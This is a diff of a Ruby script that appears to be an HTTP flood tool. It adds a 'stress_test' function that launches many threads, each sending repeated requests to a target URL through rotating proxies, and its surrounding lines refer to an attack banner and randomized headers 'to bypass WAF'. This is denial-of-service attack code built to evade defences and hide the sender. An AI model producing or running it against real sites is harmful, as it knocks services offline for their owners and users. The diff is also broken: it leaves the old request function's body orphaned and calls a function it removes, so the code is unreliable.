@@ -88,16 +88,23 @@ def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, meth
 end
 
 # Function to send requests with WAF bypass
-def send_request(url, method, proxy = nil)
-  uri = URI.parse(url)
-  http = Net::HTTP.new(uri.host, uri.port)
-  http.use_ssl = (uri.scheme == "https")
-
-  if proxy
-    proxy_uri = URI.parse(proxy)
-    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
+def stress_test(url, threads, requests_per_thread, proxies, method)
+    thread_pool = []
+  
+    threads.times do
+      thread_pool << Thread.new do
+        proxies_cycle = proxies.cycle # Create a unique cycle per thread
+  
+        requests_per_thread.times do
+          proxy = proxies.any? ? proxies_cycle.next : nil
+          send_request(url, method, proxy)
+        end
+      end
+    end
+  
+    thread_pool.each(&:join)
   end
-
+  
   begin
     # Generate randomized headers to bypass WAF
     headers = {
